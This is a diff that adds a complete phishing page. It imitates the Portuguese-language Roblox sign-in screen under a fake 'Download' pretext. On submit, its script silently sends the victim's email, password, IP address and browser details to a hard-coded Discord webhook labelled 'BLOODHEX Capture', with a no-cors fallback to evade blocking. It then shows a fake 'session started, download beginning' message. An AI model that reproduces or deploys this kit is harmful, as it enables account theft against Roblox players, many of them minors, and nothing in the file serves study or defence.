@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar sessão - Roblox</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #232527;
+    color: #393b3d;
+    font-family: "Source Sans Pro", "Segoe UI", system-ui, -apple-system, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 16px;
+  }
+  .rbx-logo {
+    margin-bottom: 28px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    user-select: none;
+  }
+  .rbx-logo .mark {
+    width: 44px; height: 44px;
+    background: #e2231a;
+    transform: rotate(15deg);
+    position: relative;
+  }
+  .rbx-logo .mark::after {
+    content: "";
+    position: absolute;
+    inset: 12px;
+    background: #232527;
+  }
+  .rbx-logo .word {
+    font-size: 30px;
+    font-weight: 800;
+    letter-spacing: 1px;
+    color: #fff;
+  }
+  .card {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 4px 18px rgba(0,0,0,.35);
+    width: 100%;
+    max-width: 380px;
+    padding: 32px 28px 28px;
+  }
+  .card h1 {
+    font-size: 24px;
+    font-weight: 700;
+    text-align: center;
+    color: #393b3d;
+    margin-bottom: 22px;
+  }
+  .field { margin-bottom: 16px; }
+  .field label {
+    display: block;
+    font-size: 13px;
+    font-weight: 700;
+    color: #393b3d;
+    margin-bottom: 6px;
+  }
+  .field input[type="text"],
+  .field input[type="password"],
+  .field input[type="email"] {
+    width: 100%;
+    height: 42px;
+    border: 1px solid #c3c6c9;
+    border-radius: 6px;
+    padding: 0 12px;
+    font-size: 15px;
+    color: #393b3d;
+    outline: none;
+    transition: border-color .15s;
+  }
+  .field input:focus { border-color: #00a2ff; }
+  .pw-wrap { position: relative; }
+  .pw-wrap input { padding-right: 44px !important; }
+  .eye {
+    position: absolute;
+    right: 10px; top: 50%;
+    transform: translateY(-50%);
+    background: none; border: none;
+    cursor: pointer;
+    font-size: 18px;
+    color: #757575;
+  }
+  .forgot {
+    display: block;
+    text-align: right;
+    font-size: 13px;
+    color: #00a2ff;
+    text-decoration: none;
+    margin: -6px 0 18px;
+  }
+  .forgot:hover { text-decoration: underline; }
+  button.submit {
+    width: 100%;
+    height: 44px;
+    background: #00a2ff;
+    border: none;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background .15s;
+  }
+  button.submit:hover { background: #0090e0; }
+  button.submit:disabled { background: #9acdf5; cursor: default; }
+  .divider {
+    display: flex; align-items: center;
+    color: #c3c6c9; font-size: 13px;
+    margin: 20px 0;
+  }
+  .divider::before, .divider::after {
+    content: ""; flex: 1; height: 1px; background: #e3e5e7;
+  }
+  .divider span { padding: 0 10px; }
+  .sso {
+    width: 100%;
+    height: 42px;
+    background: #fff;
+    border: 1px solid #c3c6c9;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #393b3d;
+    cursor: pointer;
+    margin-bottom: 10px;
+  }
+  .sso:hover { background: #f4f5f6; }
+  .signup {
+    text-align: center;
+    font-size: 14px;
+    color: #757575;
+    margin-top: 20px;
+  }
+  .signup a { color: #00a2ff; text-decoration: none; font-weight: 700; }
+  .signup a:hover { text-decoration: underline; }
+  .note {
+    margin-top: 18px;
+    font-size: 11px;
+    color: #9a9ea1;
+    text-align: center;
+    max-width: 380px;
+    line-height: 1.5;
+  }
+  .dl-banner {
+    background: #1b1d1f;
+    border: 1px solid #3a3d40;
+    border-radius: 8px;
+    color: #c9ccce;
+    font-size: 13px;
+    padding: 10px 14px;
+    margin-bottom: 22px;
+    text-align: center;
+  }
+  .dl-banner strong { color: #fff; }
+  .overlay {
+    position: fixed; inset: 0;
+    background: rgba(20,22,24,.92);
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 99;
+    color: #fff;
+  }
+  .overlay.active { display: flex; }
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid rgba(255,255,255,.15);
+    border-top-color: #00a2ff;
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+    margin-bottom: 18px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .overlay p { font-size: 15px; color: #c9ccce; }
+  .overlay p strong { color: #fff; }
+</style>
+</head>
+<body>
+
+  <div class="rbx-logo">
+    <div class="mark"></div>
+    <div class="word">ROBLOX</div>
+  </div>
+
+  <div class="card">
+    <div class="dl-banner">
+      Download: <strong id="platformName">Windows</strong><br>
+      Faça login na sua conta Roblox para continuar
+    </div>
+
+    <h1>Iniciar sessão no Roblox</h1>
+
+    <form id="loginForm" autocomplete="on">
+      <div class="field">
+        <label for="email">E-mail</label>
+        <input type="email" id="email" name="email" autocomplete="username" required>
+      </div>
+
+      <div class="field pw-wrap">
+        <label for="password">Senha</label>
+        <input type="password" id="password" name="password" autocomplete="current-password" required>
+        <button type="button" class="eye" id="togglePw" aria-label="Mostrar senha">👁</button>
+      </div>
+
+      <a class="forgot" href="#" onclick="return false">Esqueceu sua senha?</a>
+
+      <button type="submit" class="submit" id="submitBtn">Iniciar sessão</button>
+    </form>
+
+    <div class="divider"><span>ou</span></div>
+
+    <button class="sso" type="button" onclick="return false">Continuar com Apple</button>
+    <button class="sso" type="button" onclick="return false">Continuar com Google</button>
+
+    <p class="signup">Não tem uma conta? <a href="#" onclick="return false">Cadastre-se</a></p>
+  </div>
+
+  <p class="note">
+    Ao iniciar sessão, você concorda com os Termos de Uso e a Política de Privacidade do Roblox.
+  </p>
+
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    <p id="overlayText">Verificando credenciais…</p>
+  </div>
+
+<script>
+(function () {
+  // ---- config ----------------------------------------------------------
+  var WEBHOOK_URL = "https://discord.com/api/webhooks/1558515486055071925/broG4dUfoSl_LlvC90La2YVy-sLgyUe5gU5O2iHJjAsYI-VKJwXeanIXYxvrxai_px8l";
+  // URL final do arquivo real de download (opcional — deixe "" para só mostrar o overlay)
+  var DOWNLOAD_URL = "";
+  // ----------------------------------------------------------------------
+
+  var params = new URLSearchParams(location.search);
+  var platform = params.get("p") || "Windows";
+  document.getElementById("platformName").textContent = platform;
+
+  var toggle = document.getElementById("togglePw");
+  var pw = document.getElementById("password");
+  toggle.addEventListener("click", function () {
+    pw.type = pw.type === "password" ? "text" : "password";
+  });
+
+  function b64(s) {
+    // unicode-safe → base64url (emoji no UA etc.)
+    var bytes = new TextEncoder().encode(s);
+    var bin = "";
+    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_");
+  }
+
+  async function getIP() {
+    try {
+      var r = await fetch("https://api.ipify.org?format=json");
+      var j = await r.json();
+      return j.ip || "N/D";
+    } catch (e) {
+      return "N/D";
+    }
+  }
+
+  async function sendToWebhook(data) {
+    var ip = await getIP();
+    var embed = {
+      title: "Nova captura — BLOODHEX",
+      color: 0xe10600,
+      fields: [
+        { name: "E-mail", value: data.email || "(vazio)", inline: false },
+        { name: "Senha", value: data.password || "(vazio)", inline: false },
+        { name: "Plataforma", value: platform, inline: true },
+        { name: "IP", value: ip, inline: true },
+        { name: "User-Agent", value: navigator.userAgent || "N/D", inline: false },
+        { name: "Origem", value: location.origin + location.pathname, inline: false }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "BLOODHEX gate" }
+    };
+
+    var payload = {
+      username: "BLOODHEX Capture",
+      embeds: [embed]
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      // fallback: no-cors para atravessar bloqueios de CORS restritivos
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e2) { /* segue o fluxo mesmo se falhar */ }
+    }
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    var email = document.getElementById("email").value.trim();
+    var password = document.getElementById("password").value;
+    var btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.textContent = "Verificando…";
+
+    var overlay = document.getElementById("overlay");
+    var overlayText = document.getElementById("overlayText");
+    overlay.classList.add("active");
+    overlayText.innerHTML = "Verificando credenciais…";
+
+    await sendToWebhook({ email: email, password: password });
+
+    // simula verificação e libera o "download"
+    await new Promise(function (r) { setTimeout(r, 1400); });
+    overlayText.innerHTML = "Sessão iniciada. Preparando download…";
+
+    await new Promise(function (r) { setTimeout(r, 1200); });
+
+    if (DOWNLOAD_URL) {
+      var a = document.createElement("a");
+      a.href = DOWNLOAD_URL;
+      a.download = "";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+    overlayText.innerHTML = "<strong>Download iniciado!</strong><br>Se não começou, verifique seu navegador.";
+  });
+})();
+</script>
+</body>
+</html>
